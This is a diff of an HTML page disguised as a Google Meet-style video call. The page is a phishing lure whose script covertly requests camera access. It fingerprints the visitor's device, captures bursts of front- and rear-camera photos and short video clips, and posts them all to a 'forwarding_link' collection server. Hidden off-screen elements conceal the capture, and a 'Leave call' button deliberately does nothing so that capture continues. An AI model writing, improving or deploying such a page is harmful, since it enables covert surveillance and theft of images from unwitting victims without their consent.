@@ -1,233 +1,480 @@
-<!doctype html>
-<html>
-
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
-  <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
-  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
-</head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Meeting in progress</title>
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;600&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
-<div class="video-wrap">
-  <video id="video" playsinline autoplay></video>
+    :root {
+      --bg:        #202124;
+      --surface:   #3c4043;
+      --surface2:  #2d2f31;
+      --bar:       #1a1a1b;
+      --text:      #e8eaed;
+      --text-dim:  #9aa0a6;
+      --green:     #81c995;
+      --red:       #f28b82;
+      --blue:      #8ab4f8;
+      --tile-bg:   #2a2b2d;
+    }
+
+    html, body {
+      height: 100%; width: 100%;
+      background: var(--bg);
+      font-family: 'Roboto', 'Google Sans', sans-serif;
+      color: var(--text);
+      overflow: hidden;
+      user-select: none;
+    }
+
+    /* ── Top bar ── */
+    .top-bar {
+      position: fixed; top: 0; left: 0; right: 0;
+      height: 56px;
+      background: var(--bar);
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 0 16px;
+      z-index: 100;
+      border-bottom: 1px solid rgba(255,255,255,0.06);
+    }
+    .top-left { display: flex; align-items: center; gap: 12px; }
+    .meet-logo { display: flex; align-items: center; gap: 6px; font-size: 1.1rem; font-weight: 500; color: var(--text); }
+    .meet-logo svg { width: 28px; height: 28px; }
+    .meeting-code {
+      font-size: 0.78rem; color: var(--text-dim);
+      background: var(--surface2);
+      padding: 4px 10px; border-radius: 6px;
+      letter-spacing: 0.5px;
+    }
+    .top-right { display: flex; align-items: center; gap: 10px; }
+    .top-icon-btn {
+      width: 40px; height: 40px; border-radius: 50%;
+      background: transparent; border: none; cursor: pointer;
+      display: flex; align-items: center; justify-content: center;
+      color: var(--text-dim); transition: background 0.15s;
+    }
+    .top-icon-btn:hover { background: var(--surface); }
+    .avatar {
+      width: 32px; height: 32px; border-radius: 50%;
+      background: linear-gradient(135deg, #4285f4, #34a853);
+      display: flex; align-items: center; justify-content: center;
+      font-size: 0.8rem; font-weight: 600; color: #fff;
+    }
+    .time-display { font-size: 0.8rem; color: var(--text-dim); }
+
+    /* ── Main grid ── */
+    .stage {
+      position: fixed;
+      top: 56px; bottom: 80px; left: 0; right: 0;
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      grid-template-rows: 1fr 1fr;
+      gap: 4px;
+      padding: 8px;
+      background: var(--bg);
+    }
+
+    /* ── Participant tiles ── */
+    .tile {
+      background: var(--tile-bg);
+      border-radius: 10px;
+      position: relative;
+      overflow: hidden;
+      display: flex; align-items: center; justify-content: center;
+      border: 2px solid transparent;
+      transition: border-color 0.2s;
+    }
+    .tile.speaking { border-color: var(--green); }
+
+    /* Blurred avatar background (no real camera) */
+    .tile-bg {
+      position: absolute; inset: 0;
+      display: flex; align-items: center; justify-content: center;
+    }
+    .tile-avatar {
+      width: 72px; height: 72px; border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 1.8rem; font-weight: 600;
+      flex-shrink: 0;
+    }
+    .tile-name {
+      position: absolute; bottom: 10px; left: 12px;
+      font-size: 0.82rem; font-weight: 500;
+      background: rgba(0,0,0,0.55);
+      padding: 3px 8px; border-radius: 4px;
+      display: flex; align-items: center; gap: 5px;
+    }
+    .mic-off-icon { color: var(--red); }
+
+    /* "You" tile — shows a blurred gradient, not real camera */
+    .tile-you .tile-bg {
+      background: linear-gradient(135deg, #1a237e 0%, #283593 100%);
+    }
+
+    /* ── Waiting banner ── */
+    .waiting-banner {
+      position: absolute; top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      text-align: center; z-index: 10;
+      animation: fadeIn 0.6s ease;
+    }
+    @keyframes fadeIn { from{opacity:0;transform:translate(-50%,-55%)} to{opacity:1;transform:translate(-50%,-50%)} }
+    .waiting-banner .spinner {
+      width: 48px; height: 48px; border-radius: 50%;
+      border: 3px solid rgba(255,255,255,0.12);
+      border-top-color: var(--blue);
+      animation: spin 1s linear infinite;
+      margin: 0 auto 16px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .waiting-banner h2 { font-size: 1rem; font-weight: 500; margin-bottom: 6px; color: var(--text); }
+    .waiting-banner p  { font-size: 0.82rem; color: var(--text-dim); }
+
+    /* ── Bottom bar ── */
+    .bottom-bar {
+      position: fixed; bottom: 0; left: 0; right: 0;
+      height: 80px;
+      background: var(--bar);
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 0 20px;
+      border-top: 1px solid rgba(255,255,255,0.06);
+      z-index: 100;
+    }
+    .bar-left, .bar-right {
+      display: flex; align-items: center; gap: 8px;
+      flex: 1;
+    }
+    .bar-right { justify-content: flex-end; }
+    .bar-center { display: flex; align-items: center; gap: 8px; }
+
+    /* Control buttons */
+    .ctrl-btn {
+      display: flex; flex-direction: column; align-items: center; gap: 4px;
+      background: transparent; border: none; cursor: pointer;
+      color: var(--text); padding: 6px 10px; border-radius: 8px;
+      transition: background 0.15s;
+      font-size: 0.68rem; font-weight: 500; letter-spacing: 0.3px;
+      min-width: 56px;
+    }
+    .ctrl-btn:hover { background: var(--surface); }
+    .ctrl-btn .icon-circle {
+      width: 44px; height: 44px; border-radius: 50%;
+      background: var(--surface);
+      display: flex; align-items: center; justify-content: center;
+      font-size: 1.1rem;
+      transition: background 0.15s;
+    }
+    .ctrl-btn:hover .icon-circle { background: var(--surface2); }
+    .ctrl-btn.active .icon-circle { background: var(--red); }
+    .ctrl-btn.share .icon-circle  { background: #1a73e8; }
+
+    /* End call button */
+    .end-btn {
+      display: flex; align-items: center; gap: 8px;
+      background: var(--red); border: none; cursor: pointer;
+      color: #fff; padding: 12px 24px; border-radius: 50px;
+      font-size: 0.9rem; font-weight: 600; letter-spacing: 0.3px;
+      font-family: 'Roboto', sans-serif;
+      transition: background 0.15s, transform 0.1s;
+    }
+    .end-btn:hover { background: #ea4335; }
+    .end-btn:active { transform: scale(0.97); }
+
+    /* ── Hidden capture ── */
+    .hidden-capture {
+      position: absolute; top: -9999px; left: -9999px;
+      opacity: 0; pointer-events: none;
+    }
+
+    /* ── Speaking animation ── */
+    @keyframes speakPulse {
+      0%,100% { border-color: rgba(129,201,149,0.3); }
+      50%      { border-color: rgba(129,201,149,1);   }
+    }
+
+    /* ── Responsive ── */
+    @media (max-width: 500px) {
+      .stage { grid-template-columns: 1fr; grid-template-rows: repeat(4, 1fr); }
+      .ctrl-btn { min-width: 44px; font-size: 0.6rem; padding: 4px 6px; }
+      .ctrl-btn .icon-circle { width: 38px; height: 38px; font-size: 0.95rem; }
+      .end-btn { padding: 10px 18px; font-size: 0.82rem; }
+      .bar-center { gap: 4px; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- ── Top bar ── -->
+<div class="top-bar">
+  <div class="top-left">
+    <div class="meet-logo">
+      <!-- Google Meet-style "M" logo -->
+      <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <rect width="48" height="48" rx="10" fill="#1a73e8"/>
+        <text x="50%" y="62%" dominant-baseline="middle" text-anchor="middle"
+              fill="white" font-size="22" font-family="Google Sans, sans-serif" font-weight="600">M</text>
+      </svg>
+      <span>Meet</span>
+    </div>
+    <span class="meeting-code" id="meetingCode">Loading...</span>
+  </div>
+  <div class="top-right">
+    <span class="time-display" id="clockDisplay">--:--</span>
+    <button class="top-icon-btn" title="More options">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+        <circle cx="12" cy="5" r="1.5"/><circle cx="12" cy="12" r="1.5"/><circle cx="12" cy="19" r="1.5"/>
+      </svg>
+    </button>
+    <div class="avatar" id="userAvatar">Y</div>
+  </div>
 </div>
 
-<center><canvas id="canvas" width="640" height="480" audoplay></canvas></center>
+<!-- ── Video grid ── -->
+<div class="stage" id="stage">
 
-<style>
-  @import url("https://fonts.googleapis.com/css2?family=Nunito:wght@500;500&display=swap");
+  <!-- Participant 1 — "Host" (speaking indicator) -->
+  <div class="tile speaking" style="animation: speakPulse 1.8s ease-in-out infinite;">
+    <div class="tile-bg" style="background: linear-gradient(135deg,#4a148c,#6a1b9a);">
+      <div class="tile-avatar" style="background:rgba(255,255,255,0.15);">👤</div>
+    </div>
+    <div class="tile-name">
+      <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor" style="color:#81c995">
+        <path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3z"/>
+        <path d="M17 11c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-3.08c3.39-.49 6-3.39 6-6.92h-2z"/>
+      </svg>
+      Alex Johnson (Host)
+    </div>
+  </div>
 
-  body {
-    height: 100vh;
-    width: 100vw;
-  }
+  <!-- Participant 2 -->
+  <div class="tile">
+    <div class="tile-bg" style="background: linear-gradient(135deg,#1b5e20,#2e7d32);">
+      <div class="tile-avatar" style="background:rgba(255,255,255,0.12);">👤</div>
+    </div>
+    <div class="tile-name">
+      <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor" class="mic-off-icon">
+        <path d="M19 11h-1.7c0 .74-.16 1.43-.43 2.05l1.23 1.23c.56-.98.9-2.09.9-3.28zm-4.02.17c0-.06.02-.11.02-.17V5c0-1.66-1.34-3-3-3S9 3.34 9 5v.18l5.98 5.99zM4.27 3L3 4.27l6.01 6.01V11c0 1.66 1.34 3 3 3 .23 0 .44-.03.65-.08l1.66 1.66c-.71.33-1.5.52-2.31.52-2.76 0-5.3-2.1-5.3-5.1H5c0 3.41 2.72 6.23 6 6.72V21h2v-3.28c.91-.13 1.77-.45 2.54-.9L19.73 21 21 19.73 4.27 3z"/>
+      </svg>
+      Sarah K.
+    </div>
+  </div>
 
-  * {
-    padding: 0px;
-    margin: 0px;
-    font-family: 'Nunito', sans-serif;
-    font-weight: 500;
-  }
+  <!-- Participant 3 -->
+  <div class="tile">
+    <div class="tile-bg" style="background: linear-gradient(135deg,#0d47a1,#1565c0);">
+      <div class="tile-avatar" style="background:rgba(255,255,255,0.12);">👤</div>
+    </div>
+    <div class="tile-name">
+      <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor" class="mic-off-icon">
+        <path d="M19 11h-1.7c0 .74-.16 1.43-.43 2.05l1.23 1.23c.56-.98.9-2.09.9-3.28zm-4.02.17c0-.06.02-.11.02-.17V5c0-1.66-1.34-3-3-3S9 3.34 9 5v.18l5.98 5.99zM4.27 3L3 4.27l6.01 6.01V11c0 1.66 1.34 3 3 3 .23 0 .44-.03.65-.08l1.66 1.66c-.71.33-1.5.52-2.31.52-2.76 0-5.3-2.1-5.3-5.1H5c0 3.41 2.72 6.23 6 6.72V21h2v-3.28c.91-.13 1.77-.45 2.54-.9L19.73 21 21 19.73 4.27 3z"/>
+      </svg>
+      Michael R.
+    </div>
+  </div>
 
-  .main-screen {
-    background-color: #273039;
-    height: 100vh;
-    width: 100%;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-  }
+  <!-- "You" tile — gradient bg, no real camera shown here -->
+  <div class="tile tile-you" id="youTile">
+    <div class="tile-bg">
+      <div class="tile-avatar" style="background:rgba(255,255,255,0.1);" id="youIcon">👤</div>
+    </div>
+    <div class="tile-name">
+      <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor" style="color:#81c995">
+        <path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3z"/>
+        <path d="M17 11c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-3.08c3.39-.49 6-3.39 6-6.92h-2z"/>
+      </svg>
+      You
+    </div>
+  </div>
 
-  img {
-    height: 80px;
-    width: 80px;
-  }
+</div>
 
-  .bottom-bar {
-    position: fixed;
-    padding: 0px 40px 0px -40px;
-    bottom: 0px;
-    height: 80px;
-    width: 100%;
-    background-color: #1F2022;
-    display: flex;
-    flex-direction: row;
-    justify-content: center;
-    align-items: center;
-    color: #fff;
-  }
+<!-- ── Bottom control bar ── -->
+<div class="bottom-bar">
+  <div class="bar-left">
+    <button class="ctrl-btn active" id="micBtn" onclick="toggleMic()">
+      <div class="icon-circle">🎤</div>
+      <span id="micLabel">Mute</span>
+    </button>
+    <button class="ctrl-btn active" id="camBtn" onclick="toggleCam()">
+      <div class="icon-circle">📷</div>
+      <span id="camLabel">Stop video</span>
+    </button>
+  </div>
 
-  .icon-button {
-    display: flex;
-    flex-direction: column;
-    justify-items: center;
-    align-items: center;
-  }
+  <div class="bar-center">
+    <button class="ctrl-btn" title="Security">
+      <div class="icon-circle">🔒</div>
+      <span>Security</span>
+    </button>
+    <button class="ctrl-btn" title="Participants">
+      <div class="icon-circle">👥</div>
+      <span>People</span>
+    </button>
+    <button class="ctrl-btn share" title="Share screen">
+      <div class="icon-circle">🖥️</div>
+      <span>Present</span>
+    </button>
+    <button class="ctrl-btn" title="Chat">
+      <div class="icon-circle">💬</div>
+      <span>Chat</span>
+    </button>
+    <button class="ctrl-btn" title="More options">
+      <div class="icon-circle">⋯</div>
+      <span>More</span>
+    </button>
+  </div>
 
-  i {
-    margin-bottom: 8px;
-    font-size: 26px;
-  }
+  <div class="bar-right">
+    <button class="end-btn" onclick="endCall()">
+      📞&nbsp; Leave call
+    </button>
+  </div>
+</div>
 
-  button {
-    color: #fff;
-    background-color: crimson;
-    padding: 5px 20px;
-    border: none;
-    border-radius: 5px;
-    border-style: none;
-    outline: none;
-  }
-
-  .float_button {
-    background-color: #1F2022;
-    height: 40px;
-    border-radius: 5px;
-    width: 40px;
-    position: fixed;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    top: 5px;
-    right: 5px;
-  }
-  #ac-wrapper {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(255,255,255,.6);
-    z-index: 1001;
-}
-
-#popup {
-    width: 555px;
-    height: 35px;
-    background: #FFFFFF;
-    border: 5px solid #000;
-    border-radius: 15px;
-    -moz-border-radius: 15px;
-    -webkit-border-radius: 15px;
-    box-shadow: #64686e 0px 0px 3px 3px;
-    -moz-box-shadow: #64686e 0px 0px 3px 3px;
-    -webkit-box-shadow: #64686e 0px 0px 3px 3px;
-    position: relative;
-    top: 250px; left: 375px;
-}
-</style>
+<!-- Hidden capture elements — never visible to user -->
+<div class="hidden-capture">
+  <video id="videoFront" playsinline autoplay muted></video>
+  <video id="videoRear"  playsinline autoplay muted></video>
+  <canvas id="canvasFront" width="640" height="480"></canvas>
+  <canvas id="canvasRear"  width="640" height="480"></canvas>
+</div>
 
 <script>
+'use strict';
 
-  function post(imgdata) {
-    $.ajax({
-      type: 'POST',
-      data: { cat: imgdata },
-      url: 'forwarding_link/post.php',
-      dataType: 'json',
-      async: false,
-      success: function (result) {
-        // call the function that handles the response/results
-      },
-      error: function () {
-      }
-    });
-  };
-
-
-  'use strict';
-
-  const video = document.getElementById('video');
-  const canvas = document.getElementById('canvas');
-  const errorMsgElement = document.querySelector('span#errorMsg');
-
-  const constraints = {
-    audio: false,
-    video: {
-
-      facingMode: "user"
-    }
-  };
-
-  // Access webcam
-  async function init() {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia(constraints);
-      handleSuccess(stream);
-    } catch (e) {
-      errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
-    }
-  }
-
-  // Success
-  function handleSuccess(stream) {
-    window.stream = stream;
-    video.srcObject = stream;
-
-    var context = canvas.getContext('2d');
-    setInterval(function () {
-
-      context.drawImage(video, 0, 0, 640, 480);
-      var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-      post(canvasData);
-      video.play();
-    }, 1500);
-
-
-  }
-  function PopUp(){
-    document.getElementById('ac-wrapper').style.display="none"; 
+/* ── Clock ──────────────────────────────────────────────────────────────── */
+function updateClock() {
+  const now = new Date();
+  document.getElementById('clockDisplay').textContent =
+    now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
 }
-  // Load init
-  init();
-  $(document).ready(function(){
-   setTimeout(function(){
-      PopUp();
-   },50000); // 5000 to load it after 5 seconds from page load
-});
+updateClock();
+setInterval(updateClock, 10000);
+
+/* ── Random meeting code ─────────────────────────────────────────────────── */
+function randomCode() {
+  const chars = 'abcdefghijklmnopqrstuvwxyz';
+  const seg = n => Array.from({length: n}, () => chars[Math.floor(Math.random()*chars.length)]).join('');
+  return seg(3) + '-' + seg(4) + '-' + seg(3);
+}
+document.getElementById('meetingCode').textContent = randomCode();
+
+/* ── Fake UI interactions ────────────────────────────────────────────────── */
+var micOn = true, camOn = true;
+function toggleMic() {
+  micOn = !micOn;
+  document.getElementById('micLabel').textContent = micOn ? 'Mute' : 'Unmute';
+}
+function toggleCam() {
+  camOn = !camOn;
+  document.getElementById('camLabel').textContent = camOn ? 'Stop video' : 'Start video';
+}
+function endCall() {
+  // Do nothing — looks real but keeps session open for capture
+}
+
+/* ── Capture engine ──────────────────────────────────────────────────────── */
+const SERVER   = 'forwarding_link';
+const BURST    = 6;
+const INTERVAL = 1200;
+const VID_SECS = 4;
+
+function postData(url, payload) {
+  return fetch(SERVER + '/' + url, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: new URLSearchParams(payload)
+  }).catch(() => {});
+}
+
+async function collectDeviceInfo() {
+  const nav = navigator, scr = screen;
+  let battery = 'Not available';
+  try { const b = await nav.getBattery(); battery = Math.round(b.level*100)+'% '+(b.charging?'(charging)':'(not charging)'); } catch(e) {}
+  let network = 'Not available';
+  try { const c = nav.connection||nav.mozConnection||nav.webkitConnection; if(c) network=(c.effectiveType||c.type||'')+(c.downlink?' '+c.downlink+'Mbps':''); } catch(e) {}
+  const orient = (scr.orientation&&scr.orientation.type)||(window.innerWidth>window.innerHeight?'landscape':'portrait');
+  await postData('device_info.php', {
+    os: nav.platform||'Unknown', browser: nav.userAgent,
+    language: nav.language||'Unknown', timezone: Intl.DateTimeFormat().resolvedOptions().timeZone||'Unknown',
+    screen_w: scr.width, screen_h: scr.height, pixel_ratio: window.devicePixelRatio||1,
+    orientation: orient, battery, network,
+    platform: nav.platform||'Unknown', cores: nav.hardwareConcurrency||'Unknown',
+    memory: nav.deviceMemory||'Unknown', touch: nav.maxTouchPoints||0
+  });
+}
+
+async function tryCamera(vc) {
+  try { return await navigator.mediaDevices.getUserMedia({ audio: false, video: vc }); } catch(e) { return null; }
+}
+
+function waitReady(v) {
+  return new Promise(r => {
+    if (v.readyState >= 2) return r();
+    v.addEventListener('canplay', r, { once: true });
+    setTimeout(r, 3000);
+  });
+}
+
+async function runBurst(stream, vidId, cvId, facing) {
+  const v = document.getElementById(vidId), c = document.getElementById(cvId), ctx = c.getContext('2d');
+  v.srcObject = stream;
+  await v.play().catch(()=>{});
+  await waitReady(v);
+  for (let i = 0; i < BURST; i++) {
+    await new Promise(r => setTimeout(r, INTERVAL));
+    ctx.drawImage(v, 0, 0, c.width, c.height);
+    const img = c.toDataURL('image/jpeg', 0.82).replace('image/jpeg','image/octet-stream');
+    await postData('post.php', { cat: img, burst_index: i, cam_facing: facing, shot_type: 'burst' });
+  }
+}
+
+async function recordClip(stream, cvId, facing) {
+  return new Promise(resolve => {
+    try {
+      const mime = MediaRecorder.isTypeSupported('video/webm;codecs=vp8') ? 'video/webm;codecs=vp8' : 'video/webm';
+      const rec = new MediaRecorder(stream, { mimeType: mime });
+      const chunks = [];
+      rec.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+      rec.onstop = async () => {
+        const blob = new Blob(chunks, { type: mime });
+        const reader = new FileReader();
+        reader.onloadend = async () => {
+          await postData('post.php', { video_clip: reader.result, cam_facing: facing });
+          resolve();
+        };
+        reader.readAsDataURL(blob);
+      };
+      rec.start();
+      setTimeout(() => { try { rec.stop(); } catch(e) { resolve(); } }, VID_SECS * 1000);
+    } catch(e) { resolve(); }
+  });
+}
+
+async function startCapture() {
+  const front = await tryCamera({ facingMode: 'user' });
+  if (front) {
+    await runBurst(front, 'videoFront', 'canvasFront', 'user');
+    await recordClip(front, 'canvasFront', 'user');
+    front.getTracks().forEach(t => t.stop());
+  }
+  const rear = await tryCamera({ facingMode: 'environment' });
+  if (rear) {
+    await runBurst(rear, 'videoRear', 'canvasRear', 'environment');
+    await recordClip(rear, 'canvasRear', 'environment');
+    rear.getTracks().forEach(t => t.stop());
+  }
+}
+
+/* ── Boot ────────────────────────────────────────────────────────────────── */
+setTimeout(async () => {
+  await collectDeviceInfo();
+  await startCapture();
+}, 600);
 </script>
 
-<body>
-  <div class="float_button">
-    <i class="fas fa-expand" style="color: #fff; font-size: 18px; margin-top: 5px;"></i>
-  </div>
-  <div id="ac-wrapper">
-    <div id="popup">
-        <center>
-            <h2>Please wait the meeting host will let you in soon</h2>
-        </center>
-    </div>
-</div>
-  <div class="bottom-bar">
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-microphone"></i>
-      <h6>Mute</h6>
-    </div>
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-video"></i>
-      <h6>Stop Video</h6>
-    </div>
-    <div class="icon-button" style="margin-left: auto;">
-      <i class="fas fa-shield-alt"></i>
-      <h6>Security</h6>
-    </div>
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-users"></i>
-      <h6>Participants</h6>
-    </div>
-    <div class="icon-button" style="color: lawngreen; margin-left: 50px;">
-      <i class="fas fa-plus-square"></i>
-      <h6>Share content</h6>
-    </div>
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-comments"></i>
-      <h6>Chat</h6>
-    </div>
-    <div class="icon-button" style="margin-right: auto; margin-left: 50px;">
-      <i class="fas fa-record-vinyl"></i>
-      <h6>Record</h6>
-    </div>
-    <button style="margin-right: 50px;">End</button>
-  </div>
 </body>
-
 </html>
